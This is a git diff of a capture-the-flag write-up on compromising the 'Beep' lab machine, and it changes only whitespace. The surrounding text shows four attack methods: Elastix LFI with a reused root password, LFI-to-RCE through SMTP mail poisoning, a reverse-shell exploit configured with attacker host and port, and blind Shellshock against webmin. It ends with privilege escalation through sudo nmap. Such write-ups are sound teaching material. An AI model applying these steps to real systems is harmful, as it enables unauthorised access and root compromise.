@@ -60,10 +60,10 @@ Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: U
 Host script results:
 |_clock-skew: -1s
 ```
-Poking around on port 443 we can see an elastix service on the webroot and a freePBX service running under /admin route.
-under /help and scroll to backup we can see some screenshots dated 2010. so we know that elastix version is quite old.
-According to http://freshmeat.sourceforge.net/projects/elastix we can see that the release version should be 2.0/2.2.
-So we can searchsploit for elastix.
+Poking around on port 443 we can see an elastix service on the webroot and a freePBX service running under /admin route.  
+under /help and scroll to backup we can see some screenshots dated 2010. so we know that elastix version is quite old.  
+According to http://freshmeat.sourceforge.net/projects/elastix we can see that the release version should be 2.0/2.2.  
+So we can searchsploit for elastix.  
 ```
 [root@kali Beep ]$ searchsploit elastix                
 --------------------------------------------------------------------------------- ---------------------------------
@@ -78,7 +78,7 @@ Elastix - 'page' Cross-Site Scripting                                           
 FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                           | php/webapps/18650.py
 --------------------------------------------------------------------------------- ---------------------------------
 ```
-The below two are good candidates, so let's test them.
+The below two are good candidates, so let's test them.  
 ```
 [root@kali Beep ]$ searchsploit elastix                
 --------------------------------------------------------------------------------- ---------------------------------
@@ -164,14 +164,14 @@ ASTSPOOLDIR=/var/spool/asterisk
 ASTRUNDIR=/var/run/asterisk
 ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
 ```
-Here, we can see repeatedly more than once the password ```jEhdIekWmdjE```, we can test if this box is affected from a password reuse vulnerability.
-We can try to ssh as root into the box using the the discovered password, and as we can se we do get a prompt
+Here, we can see repeatedly more than once the password ```jEhdIekWmdjE```, we can test if this box is affected from a password reuse vulnerability.  
+We can try to ssh as root into the box using the the discovered password, and as we can se we do get a prompt  
 
 ### Method 2 - php/webapps/37637.pl getting RCE from LFI using SMTP
-Always by using 37637.pl, we can get an RCE from a LFI.
-From the initial nmap scan, we can see that port 25 (smtp) is opened.
-We know that using smtp we can send email connecting to port 25, when we send emails, a file is written under /var/mail/%RCPT_USER%.
-Now we need to check what is the user that is executing the webserver, so that then, we can send an email with a payload to that user, read the email using LFI and get a shell.
+Always by using 37637.pl, we can get an RCE from a LFI.  
+From the initial nmap scan, we can see that port 25 (smtp) is opened.  
+We know that using smtp we can send email connecting to port 25, when we send emails, a file is written under /var/mail/%RCPT_USER%.  
+Now we need to check what is the user that is executing the webserver, so that then, we can send an email with a payload to that user, read the email using LFI and get a shell.  
 To check what is the webserver user we can use the LFI vulnerability and request ```/proc/self/status```, and we'll get the following:
 ```
 Name:	httpd
@@ -212,7 +212,7 @@ CapEff:	0000000000000000
 Cpus_allowed:	00000001
 Mems_allowed:	1
 ```
-As we can see we do get Uid 100 and Pid 101, checking with ```/etc/passwd``` we can see that this Uid is related to the user asterisk.
+As we can see we do get Uid 100 and Pid 101, checking with ```/etc/passwd``` we can see that this Uid is related to the user asterisk.  
 now we can send an email to asterisk@localhost connecting to port 25:
 ```
 Trying 10.10.10.7...
@@ -258,17 +258,17 @@ current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&a
 ```
 
 ### Method 3 - php/webapps/18650.py
-As discovered in the initial enumeration phase we have another exploit (18650.py) that is elegible for a successul exploitation.
-In the variable section we can notice that we are required to set an "extension" variable.
+As discovered in the initial enumeration phase we have another exploit (18650.py) that is elegible for a successul exploitation.  
+In the variable section we can notice that we are required to set an "extension" variable.  
 ```
 rhost="10.10.10.7"
 lhost="10.10.14.18"
 lport=443
 extension="1000"
 ```
-Running this exploit with extension value of 1000 does not work, so we need to enumerate SIP extensions using SIPVicious.
-SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. This suite has five tools:
-svmap, svwar, svcrack, svreport, svcrash.
+Running this exploit with extension value of 1000 does not work, so we need to enumerate SIP extensions using SIPVicious.  
+SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. This suite has five tools:  
+svmap, svwar, svcrack, svreport, svcrash.  
 We can try to run svmap to enumerate SIP service:
 ```
 [root@kali exploits ]$ svmap 10.10.10.7                    
@@ -298,9 +298,9 @@ extension="233"
 Now, we can setup a netcat listener on port 443 and get a reverse shell.
 
 ### Method 4 - Shellshock
-as we can see from the initial nmap scan, a service called webmin is running on port 10000.
-Because webmin is using lots of .cgi files we can try to shellshock this service and see if we can get a shell.
-With burp, we can try to intercept the login page and change the user-agent as follow:
+as we can see from the initial nmap scan, a service called webmin is running on port 10000.  
+Because webmin is using lots of .cgi files we can try to shellshock this service and see if we can get a shell.  
+With burp, we can try to intercept the login page and change the user-agent as follow:  
 ```
 GET / HTTP/1.1
 Host: 10.10.10.7:10000
@@ -316,8 +316,8 @@ Cache-Control: max-age=0
 Te: trailers
 Connection: close
 ```
-In the response we are not seeing any hello, so we can try blind method to check if webmin is vulnerable to shellshock.
-If we perform a request we can se that the response comes in about 100 ms (more or less).
+In the response we are not seeing any hello, so we can try blind method to check if webmin is vulnerable to shellshock.  
+If we perform a request we can se that the response comes in about 100 ms (more or less).  
 So, now we can try to perform the following request:
 ```
 GET / HTTP/1.1
@@ -334,8 +334,8 @@ Cache-Control: max-age=0
 Te: trailers
 Connection: close
 ```
-Using a sleep 10 we can see that the response come out in ~10000 ms.
-With this blind method we checked that code can be executed on server side.
+Using a sleep 10 we can see that the response come out in ~10000 ms.  
+With this blind method we checked that code can be executed on server side.  
 Now we can perform the following request and get code execution.
 ```
 GET / HTTP/1.1
@@ -378,7 +378,7 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /sbin/chkconfig
     (root) NOPASSWD: /usr/sbin/elastix-helper
 ```
-Also according to [GTFOBins](https://gtfobins.github.io/) we can privesc with the following: nmap, yum, chmod, chown, service.
+Also according to [GTFOBins](https://gtfobins.github.io/) we can privesc with the following: nmap, yum, chmod, chown, service.  
 Let's use nmap as suggested by 18650.py, now we can do the following:
 ```
 bash-3.2$ sudo nmap --interactive
